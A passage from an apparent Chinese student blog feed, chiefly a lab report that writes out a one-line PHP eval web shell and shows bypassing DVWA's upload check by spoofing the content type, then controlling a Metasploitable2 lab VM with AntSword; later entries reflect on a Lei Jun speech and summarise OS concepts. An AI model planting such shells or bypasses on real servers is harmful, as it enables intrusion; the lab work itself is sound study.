        <content type="html"><![CDATA[<h1 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1 实验环境"></a>1 实验环境</h1><ol><li>操作系统版本：Windows 11 家庭中文版23H2</li><li>VMware® Workstation 16 Pro：16.2.3 build-19376536</li><li>Metasploitable2虚拟机版本：2.6.24-16-server</li><li>Kali虚拟机版本：6.6.9-amd64</li></ol><hr><h1 id="2-实验内容"><a href="#2-实验内容" class="headerlink" title="2 实验内容"></a>2 实验内容</h1><p>编写木马程序文件<code>muma.php</code>，内容如下所示：</p><center>代码清单2.1  muma.php文件内容</center><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;176&#x27;</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先开启<code>Metasploitable</code>虚拟机，输入用户名和密码进行登录，之后输入“<code>ifconfig</code>”命令查看虚拟机的IP地址，如图2.1所示。</p><p><img src="/2024/07/20/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image_zMCKE7xMCb.png"></p><center>图2.1  查看`Metasploitable`虚拟机的IP地址</center><p>开启Kali虚拟机，在浏览器中输入上述IP地址访问Web服务，输入用户名和密码后进行登录，并设置网站的安全等级为“medium”，并点击“Submit”，操作内容如图2.2所示。</p><p><img src="/2024/07/20/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image_1_C-n7X0AMVj.png"></p><center>图2.2  设置网站安全等级</center><p>之后测试文件上传功能，点击“Upload”，选择木马程序文件<code>muma.php</code>文件进行上传，结果如图2.3所示。</p><p><img src="/2024/07/20/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image_2_i5U2fwx01G.png"></p><center>图2.3  木马程序上传失败</center><p>所以如果不进行数据包的修改，是不能成功上传木马程序的。接下来我们在上传木马程序的过程中进行抓包，首先需要设置Kali虚拟机浏览器的HTTP代理，如图2.4所示。</p><p><img src="/2024/07/20/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image_3_fngw4viysu.png"></p><center>图2.4  设置浏览器HTTP代理</center><p>之后在Kali虚拟机中重新上传木马程序，同时打开Burp Suite的拦截功能，在重新上传的过程中，抓取的数据包如图2.5所示。</p><p><img src="/2024/07/20/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image_4_lI5XiBotS-.png"></p><center>图2.5  上传木马程序抓取的数据包</center><p>可以看到，在该数据包中文件类型字段是PHP，但是我们设置了网站的安全等级是“medium”，查看其源码如代码清单2.2所示。</p><center>代码清单2.2  网站源代码</center><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="variable">$target_path </span>= DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;  </span><br><span class="line">            <span class="variable">$target_path </span>= <span class="variable">$target_path </span>. <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);  </span><br><span class="line">            <span class="variable">$uploaded_name </span>= <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];  </span><br><span class="line">            <span class="variable">$uploaded_type </span>= <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];  </span><br><span class="line">            <span class="variable">$uploaded_size </span>= <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span><span class="title function_ invoke__"> </span>((<span class="variable">$uploaded_type </span>== <span class="string">&quot;jpeg&quot;</span>) &amp;&amp; (<span class="variable">$uploaded_size </span>&lt; <span class="number">100000</span>))&#123;  </span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;  </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;  </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;  </span><br><span class="line">                      </span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                  </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;  </span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$target_path </span>. <span class="string">&#x27; succesfully uploaded!&#x27;</span>;  </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;  </span><br><span class="line">                      </span><br><span class="line">                    &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span>&#123;  </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>在网页的源码中，会检查所上传的文件类型是否是“jpeg”，这也就说明了为什么我们第一次上传木马程序的过程中为什么会失败，因为我们的文件后缀名是PHP。因此我们可以将数据包中的这个字段修改为“jpeg”，以欺骗程序认为我们上传的是jpeg文件。</p><p>上传成功的结果如图2.6所示，网页提示我们上传成功。</p><p><img src="/2024/07/20/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image_5_lW1qtx0z2n.png"></p><center>图2.6  成功上传木马程序</center><p>此时，需要返回到<code>Metasploitable2</code>虚拟机中查看是否真的上传成功，查看结果如图2.7所示。</p><p><img src="/2024/07/20/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image_6_uwONVVzfi5.png"></p><center>图2.7  在服务器端成功上传</center><p>此时我们就达到了上传木马程序到服务器的目的，接下来需要使用远程连接来控制<code>Metasploitable2</code>的服务器，这里使用中国蚁剑来进行测试，输入木马程序所在的地址，以及木马程序中设置的登录密码，如图2.8所示，之后点击保存。</p><p><img src="/2024/07/20/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image_7_Wl5Ki0h6ME.png"></p><center>图2.8  配置远程连接</center><p>添加结果如图2.9所示。</p><p><img src="/2024/07/20/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image_8_hbiz9h0RZI.png"></p><center>图2.9  远程连接添加成功</center><p>之后点击右键，选择“虚拟终端”，访问结果如图2.10所示，可以看到这里可以对木马程序所在的服务器进行随意的更改，这里把所在目录下的文件neuq.jpg文件进行成功删除。</p><p><img src="/2024/07/20/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image_9_Wo8m9OJkoF.png"></p><center>图2.10  远程连接木马程序成功</center><hr><h1 id="3-实验总结"><a href="#3-实验总结" class="headerlink" title="3 实验总结"></a>3 实验总结</h1><ol><li>文件上传漏洞是一种常见的Web安全漏洞，如果系统的管理员不会用户上传的文件进行严格审查的话，用户可以利用这个漏洞上传一些木马文件，进而取得对系统的控制权。</li><li>在本次实验中，我们就通过上传一个木马程序到服务器中，并通过中国蚁剑这个软件实现了对远程服务器的非法操控，可以对其上的文件进行随意的修改，可以想象一下，如果这发生在现实生活中的话，必然会造成不可挽回的损失。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大佬演讲1：雷军2024年度演讲《勇气》</title>
      <link href="/2024/07/19/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B21%EF%BC%9A%E9%9B%B7%E5%86%9B2024%E5%B9%B4%E5%BA%A6%E6%BC%94%E8%AE%B2%E3%80%8A%E5%8B%87%E6%B0%94%E3%80%8B/"/>
      <url>/2024/07/19/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B21%EF%BC%9A%E9%9B%B7%E5%86%9B2024%E5%B9%B4%E5%BA%A6%E6%BC%94%E8%AE%B2%E3%80%8A%E5%8B%87%E6%B0%94%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p>上了大学特别是学了计算机之后经常能够听到雷军的故事，他也是计算机专业，武汉大学毕业，所以更能感觉到共鸣吧。</p><p>之前也回看过雷军的演讲，但是今天有幸听了现场直播，感受如下。</p><h1 id="1-遇到困难勇于面对"><a href="#1-遇到困难勇于面对" class="headerlink" title="1 遇到困难勇于面对"></a>1 遇到困难勇于面对</h1><p><img src="/2024/07/19/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B21%EF%BC%9A%E9%9B%B7%E5%86%9B2024%E5%B9%B4%E5%BA%A6%E6%BC%94%E8%AE%B2%E3%80%8A%E5%8B%87%E6%B0%94%E3%80%8B/image_JUAIExWu0E.png"></p><blockquote><p>无论面对何等巨大的危机，都不能被吓到。破釜沉舟的勇气，才是冲出重围的关键。——雷军</p></blockquote><p>小米造车源于一次来自美国的打击，之后雷总想，“如果哪一天小米不能造手机了，靠什么活下去？”，正是从此刻开始，小米有了造车的想法。</p><p>所以说，当遇到困难的时候，很多人想的是自己怎么这么难，生活不如意，为什么自己好倒霉等等。但是无论遇到什么困难，都应该有一个勇往直前的决心，正是困难才能让你不断进步，让你反思自己身上存在的问题，让你更加了解自己。</p><p>心态是一方面，同时也要采取行动去应对它，而不是等待困难自己消失。想想自己该怎么做，以及这么做是否对自己以及未来的自己是有益的？</p><hr><h1 id="2-尊重行业规律"><a href="#2-尊重行业规律" class="headerlink" title="2 尊重行业规律"></a>2 尊重行业规律</h1><p><img src="/2024/07/19/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B21%EF%BC%9A%E9%9B%B7%E5%86%9B2024%E5%B9%B4%E5%BA%A6%E6%BC%94%E8%AE%B2%E3%80%8A%E5%8B%87%E6%B0%94%E3%80%8B/image_1tJCOGSa6G.png"></p><blockquote><p>守正出奇，要先守正再出奇，守正有时候比出奇更重要。——雷军</p></blockquote><p>做什么行业，做什么事情要尊重行业或事情发展的规律，任何事物都有一个发展的过程，不能一蹴而就。小米造车，借鉴了其他车企成长的路线，当学习别人的方法的过程中，再逐渐产生自己的想法。</p><p>感觉这个很有道理，就像你做科研，如果你都不了解你研究领域的其他人的一些现有的进展，而是一味埋头苦干，这样也违反了事物的发展规律。</p><hr><h1 id="3-坚持做一件事"><a href="#3-坚持做一件事" class="headerlink" title="3 坚持做一件事"></a>3 坚持做一件事</h1><p><img src="/2024/07/19/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B21%EF%BC%9A%E9%9B%B7%E5%86%9B2024%E5%B9%B4%E5%BA%A6%E6%BC%94%E8%AE%B2%E3%80%8A%E5%8B%87%E6%B0%94%E3%80%8B/image_EMpKuTFgnc.png"></p><blockquote><p>坚持做难而正确的事情，才能走得更远。——雷军</p></blockquote><p>这个道理我已经在很多地方都学习过了，而且我现在也正在做这件事。有的事情确实很困难，难就难在需要积累上，并不是说我今天学了1天就能掌握，而是长期学习得到的效果。</p><p>同时也应该注意一下“正确”这个字眼吧，如果一直坚持做错误的事情，无论做多久也不会有收获，个人认为事情的正确与否是对自己来说的，并没有绝对的正确和错误，只是说对于当前以及未来的你是否有价值。</p><hr><h1 id="4-热爱自己所做的工作"><a href="#4-热爱自己所做的工作" class="headerlink" title="4 热爱自己所做的工作"></a>4 热爱自己所做的工作</h1><p><img src="/2024/07/19/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B21%EF%BC%9A%E9%9B%B7%E5%86%9B2024%E5%B9%B4%E5%BA%A6%E6%BC%94%E8%AE%B2%E3%80%8A%E5%8B%87%E6%B0%94%E3%80%8B/image_racdPoxr_h.png"></p><blockquote><p>懂一行，爱一行，才能真正干好这一行。——雷军</p></blockquote><p>兴趣是最好的老师，庆幸自己转专业到了计算机，感觉自己挺喜欢计算机这个行业的，一想到未来可以从事我喜欢的行业就感觉很开心。同时，感觉打电脑的日子时间过得很快，自己也很喜欢弄网站这些东西，感觉很有意思。</p><p>所以，既然热爱就坚持做下去，一定会有所收获和成就的。</p><hr><h1 id="5-不要害怕自己的弱点"><a href="#5-不要害怕自己的弱点" class="headerlink" title="5 不要害怕自己的弱点"></a>5 不要害怕自己的弱点</h1><p><img src="/2024/07/19/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B21%EF%BC%9A%E9%9B%B7%E5%86%9B2024%E5%B9%B4%E5%BA%A6%E6%BC%94%E8%AE%B2%E3%80%8A%E5%8B%87%E6%B0%94%E3%80%8B/image_bGXisT5jZ5.png"></p><p>雷总在造车的过程中，为了更好的体验用户开车的感受，他自己开始学习开车，并且阅读了很多关于造车的书籍，所以感慨他即使是一个程序员，即使他不懂车，即使他没有造过车，但是他并不担心这些问题。雷总通过自己的努力，还考下了赛照。</p><p>雷总勇于去弥补自己没有学过的功课，而且最主要之前没有学过不重要，因为那些都过去了，重要的是当下和未来，你该怎么做。并且不要害怕自己的弱点，这个道理我也是最近才明白吧。</p><p>就像我的一个弱点是英语口语，我现在并不害怕它了，尽管我承认我现在的英语口语确实很糟糕，但是我每天都去练习，找语伴，我相信我学一天、两天、三天，我肯定可以学会的。</p><p>任何会对我造成影响的弱点，我都会去改变，去训练，让他变成我的强项。并且不论自己多大，都保持学习能力，人生的意义是去体验这个世界，学习并不是狭义的上课、做作业等，看一本书也是学习，看一部电影同样也是一种学习。</p><hr><h1 id="6-采取行动"><a href="#6-采取行动" class="headerlink" title="6 采取行动"></a>6 采取行动</h1><p><img src="/2024/07/19/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B21%EF%BC%9A%E9%9B%B7%E5%86%9B2024%E5%B9%B4%E5%BA%A6%E6%BC%94%E8%AE%B2%E3%80%8A%E5%8B%87%E6%B0%94%E3%80%8B/image_88P6MU4VT6.png"></p><blockquote><p>勇气不是喊口号，而是每一步脚踏实地的行动。——雷军</p></blockquote><p>还是那个道理，不管干什么，都要自己动手去做。纸上得来终觉浅，绝知此事要躬行，就算你不知道怎么去学一个东西，那你就先去随便学，起码要做出一些行动，在学的过程中，慢慢你就知道该怎么去做了。</p><p>所以我很佩服企业家，因为他们肯定都是一个优秀的实践家，他们的事业都是自己做出来的，而不是每天做白日梦想出来的，向雷总学习。</p><hr><h1 id="7-Summary"><a href="#7-Summary" class="headerlink" title="7 Summary"></a>7 Summary</h1><p><img src="/2024/07/19/%E5%A4%A7%E4%BD%AC%E6%BC%94%E8%AE%B21%EF%BC%9A%E9%9B%B7%E5%86%9B2024%E5%B9%B4%E5%BA%A6%E6%BC%94%E8%AE%B2%E3%80%8A%E5%8B%87%E6%B0%94%E3%80%8B/image_T3QqpLlYSh.png"></p><blockquote><p>勇气，并非没有恐惧，而是面对恐惧，依然坚定不移。<br>勇气，来自坚定的信念，奔涌不息的热情，和每一步的脚踏实地。<br>勇气，就是人类最伟大的赞歌！                                                  ——雷军</p></blockquote><p>我现在才刚21岁，人生的旅途才刚刚开始，感觉从上个寒假过来好像自己才有了自己的意识，知道自己该干啥，我的人生还有无限可能！</p><p>所以说，你想去干什么，趁年轻就去干，不用考虑这考虑那，磨磨唧唧的，勇往直前，走好属于你自己的路。</p>]]></content>
      
      
      <categories>
          
          <category> 大佬演讲 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习思考 </tag>
            
            <tag> 小米 </tag>
            
            <tag> 演讲 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统面经1：计算机系统概述</title>
      <link href="/2024/07/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/"/>
      <url>/2024/07/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/07/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/image_n4ZRLKRnWT.png"></p><h1 id="1-操作系统的目标和功能（什么是操作系统？）"><a href="#1-操作系统的目标和功能（什么是操作系统？）" class="headerlink" title="1 操作系统的目标和功能（什么是操作系统？）"></a>1 操作系统的目标和功能（什么是操作系统？）</h1><h2 id="1-1-操作系统是计算机资源的管理者"><a href="#1-1-操作系统是计算机资源的管理者" class="headerlink" title="1.1 操作系统是计算机资源的管理者"></a>1.1 <strong>操作系统是计算机资源的管理者</strong></h2><ol><li>处理机管理（进程控制、进程同步、进程通信、死锁处理、处理机调度）</li><li>存储器管理（提高内存利用率，内存的分配与回收、地址映射、内存保护与共享、内存扩充）</li><li>文件管理（计算机中的信息都是以文件的形式存在的）</li><li>设备管理（完成用户的I&#x2F;O请求，方便用户使用设备、并提高设备的利用率）</li></ol><h2 id="1-2-操作系统为用户提供使用计算机硬件系统的接口"><a href="#1-2-操作系统为用户提供使用计算机硬件系统的接口" class="headerlink" title="1.2 操作系统为用户提供使用计算机硬件系统的接口"></a>1.2 <strong>操作系统为用户提供使用计算机硬件系统的接口</strong></h2><ol><li>命令接口（用户通过控制台或终端输入操作命令，向系统提供各种服务要求）</li><li>程序接口（由 系统调用 组成，用户在程序中使用这些系统调用来请求操作系统为其提供服务）</li><li>图形接口 最常见的 图形用户界面GUI （最终还是通过调用程序接口实现的）</li></ol><h2 id="1-3-操作系统用作扩充机器"><a href="#1-3-操作系统用作扩充机器" class="headerlink" title="1.3 操作系统用作扩充机器"></a>1.3 <strong>操作系统用作扩充机器</strong></h2><p>没有任何软件支持的计算机称为裸机，实际呈现在用户面前的计算机系统是经过若干层软件改造的计算机。</p><p>操作系统将裸机改造成功能更强、使用更方便的机器。我们将覆盖了软件的机器称为扩充机器或虚拟机。</p><hr><h1 id="2-操作系统的运行机制？"><a href="#2-操作系统的运行机制？" class="headerlink" title="2 操作系统的运行机制？"></a>2 操作系统的运行机制？</h1><h2 id="2-1-内核程序和应用程序-内核态和用户态"><a href="#2-1-内核程序和应用程序-内核态和用户态" class="headerlink" title="2.1 内核程序和应用程序(内核态和用户态)"></a>2.1 <strong>内核程序和应用程序(内核态和用户态)</strong></h2><p>在计算机系统中，通常CPU执行两种不同性质的程序：一种是操作系统内核程序；另一种是用户自编程序或系统外层的应用程序。</p><p>内核程序是应用程序的”管理者”。“管理程序“可以执行一些特权指令，而”被管理程序“出于安全考虑不能执行这些指令。</p><p>所谓特权指令，是指计算机中不允许用户直接使用的指令，如：I&#x2F;O指令、置中断指令，存取用于内存保护的寄存器，送程序状态字到程序状态字寄存器等指令。</p><p>操作系统在具体实现上划分了用户态（目态）和核心态（管态），以严格区分两类程序。</p><h2 id="2-2-层次式结构"><a href="#2-2-层次式结构" class="headerlink" title="2.2 层次式结构"></a>2.2 <strong>层次式结构</strong></h2><p>操作系统的各项功能分别被设置在不同的层次上。一些与硬件关联较紧密的模块，诸如时钟管理、中断管理、设备驱动等处于最底层。其次是运行频率较高的程序，诸如进程管理、存储管理和设备管理等。</p><p>上面的这两部分内容构成了操作系统的内核，这部分内容的指令操作工作在核心态。</p><h2 id="2-3-内核"><a href="#2-3-内核" class="headerlink" title="2.3 内核"></a>2.3 <strong>内核</strong></h2><p>内核是计算机上配置的底层软件，是计算机功能的延伸，包括以下4个方面的内容：</p><ol><li><p>时钟管理&#x20;</p><p>时钟的第一功能是计时，操作系统需要通过时钟管理，向用户提供标准的系统时间。其次，通过时钟中断的管理，可以实现进程的切换。</p><p>在分时操作系统中，采用时间片轮转调度的实现；</p><p>在实时系统中，按截至时间控制运行的实现；</p><p>在批处理系统中，通过时钟管理来衡量一个作业的运行程度等。</p></li><li><p>中断机制</p><p>引入中断技术的初衷是提高多道程序运行环境中CPU的利用率，主要针对外部设备。后来逐步得到发展，形成了多种类型，成为操作系统各项操作的基础。如，键盘或鼠标信息的输入、进程的管理和调度、系统功能的调用、设备驱动、文件访问等。都依赖于中断机制。</p><p>可以说，现代操作系统是靠中断驱动的软件。中断机制中，只有一小部分功能属于内核，负责保护和恢复中断现场的信息，转移控制权到相关的处理程序。这样可以减少中断的处理时间，提高系统的并行处理能力。</p></li><li><p>原语</p><p>操作系统底层是一些可被调用的公用小程序，它们各自完成一个规定的操作，其特点是：</p><ul><li>它们处于操作系统的最底层，是最接近硬件的部分</li><li>这些程序的运行具有原子性，其操作只能一气呵成</li><li>这些程序的运行时间都较短，而且调用频繁</li></ul></li><li><p>系统控制的数据结构及处理</p><p>系统中用来登记状态信息的数据结构很多，比如：作业控制块、进程控制块、设备控制块、各类链表等。为了实现有效的管理，系统需要一些基本的操作，常见的操作有以下三种：</p><ul><li>进程管理：进程状态管理、进程调度和分配、创建和撤销进程控制块等</li><li>存储器管理：存储器的空间分配和回收、内存信息保护程序、代码对换程序等</li><li>设备管理：缓冲区管理、设备分配和回收等</li></ul></li></ol><hr><h1 id="3-中断和异常？"><a href="#3-中断和异常？" class="headerlink" title="3 中断和异常？"></a>3 中断和异常？</h1><h2 id="3-1-中断的引入"><a href="#3-1-中断的引入" class="headerlink" title="3.1 中断的引入"></a>3.1 中断的引入</h2><p>中断的引入是为了<strong>支持CPU和设备之间的并行操作</strong>。</p><p>中断也称外中断，指来自CPU执行指令以外的事件的发生，如设备发出的I&#x2F;O结束中断、时钟中断等。这一类中断通常是与当前执行的指令无关的事件。</p><h2 id="3-2-异常的引入"><a href="#3-2-异常的引入" class="headerlink" title="3.2 异常的引入"></a>3.2 异常的引入</h2><p>异常的引入是表示<strong>CPU执行指令本身时出现的问题</strong>。</p><p>异常也称内中断、例外或陷入，指源自CPU执行指令内部的事件，如程序的非法操作码、地址越界、算术溢出、缺页异常等。对异常的处理一般要依赖与当前程序的运行现场，不能被屏蔽。</p><h2 id="3-3-中断和异常的联系与区别"><a href="#3-3-中断和异常的联系与区别" class="headerlink" title="3.3 中断和异常的联系与区别"></a>3.3 中断和异常的联系与区别</h2><p><img src="/2024/07/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/image_eWQCjd69-5.png"></p><h2 id="3-4-中断执行的流程"><a href="#3-4-中断执行的流程" class="headerlink" title="3.4 中断执行的流程"></a>3.4 中断执行的流程</h2><p><img src="/2024/07/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/image_Ednw5Gre2i.png"></p><p>以上是多重中断的流程，其中，1~3步是由硬件（中断隐指令）完成的；4-9步是由中断服务程序完成的。</p><hr><h1 id="4-系统调用？"><a href="#4-系统调用？" class="headerlink" title="4 系统调用？"></a>4 系统调用？</h1><p>计算机系统的各种硬件资源是有限，为了更好的管理这些资源，进程是不允许直接操作的，所有对这些资源的访问都必须有操作系统控制。也就是说操作系统是使用这些资源的唯一入口，而这个入口就是操作系统提供的系统调用。</p><p>一般地，系统调用都是通过中断实现的，比如，<code>linux</code>下中断号<code>0x80</code>就是进行系统调用的。</p><p>操作系统为用户态进程与硬件设备进行交互提供了一组接口——系统调用：</p><ol><li>把用户从底层的硬件编程中解放了出来</li><li>极大地提高了系统的安全性使用户程序具有可移植性；用户程序与具体硬件已经被抽象接口所替代。</li></ol><p>系统调用流程图如下：</p><p><img src="/2024/07/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/image_MwmY8uJyv1.png"></p><hr><h1 id="5-宏内核、微内核和混合内核"><a href="#5-宏内核、微内核和混合内核" class="headerlink" title="5 宏内核、微内核和混合内核"></a>5 宏内核、微内核和混合内核</h1><p><img src="/2024/07/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/image_26K7HGhRrz.png"></p><h2 id="5-1-宏内核"><a href="#5-1-宏内核" class="headerlink" title="5.1 宏内核"></a>5.1 宏内核</h2><p>宏内核是大而全的管理者。</p><p>宏内核，也被称为单体内核，是一种把所有的服务都集中在一起的内核设计。它的优点是性能高，因为所有服务都在内核中运行，调用过程简单，效率高。但是，这种设计也有缺点，如果内核中的一个服务出现问题，可能会影响到整个系统的稳定性。</p><p>就像一个城市的交通系统，所有的道路、桥梁、交通信号灯都是由一个中央指挥系统控制。这种方式的优点是效率高，因为所有的交通运输都在同一个系统内部进行调度，所以调度速度快，交通流畅。然而，缺点也很明显，如果中央指挥系统出现问题，那么整个城市的交通都可能会受到影响，导致严重的交通拥堵。</p><p>宏内核的代表有Unix，Linux等。</p><h2 id="5-2-微内核"><a href="#5-2-微内核" class="headerlink" title="5.2 微内核"></a>5.2 微内核</h2><p>微内核是小而美的服务商。</p><p>微内核，只提供最基本的服务，如进程调度、内存管理等，其他的服务，如文件系统、网络协议等，都在内核之外的用户空间中运行。这种设计的优点是结构简单，容易理解和修改，如果一个服务出现问题，也不会影响到其他服务。但是，这种设计的缺点是性能较低，因为服务之间的调用需要在内核和用户空间之间进行切换，效率较低。</p><p>就像一个城市的交通系统中，只有最基本的道路和桥梁是由中央指挥系统控制，其他的如公交、出租车等都是由各自的调度系统进行管理。这种方式的优点是稳定性好，因为即使一个服务出现问题，也不会影响到其他的服务。然而，缺点是效率较低，因为服务之间的调度需要在内核和用户空间之间进行切换，这就像各个调度系统之间需要进行协调，导致交通运输的效率降低。</p><p>微内核的代表有Mach，据说鸿蒙也是微内核。</p><p><img src="/2024/07/18/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F1%EF%BC%9A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/image_HL0f_oZBR-.png"></p><h2 id="5-3-混合内核"><a href="#5-3-混合内核" class="headerlink" title="5.3 混合内核"></a>5.3 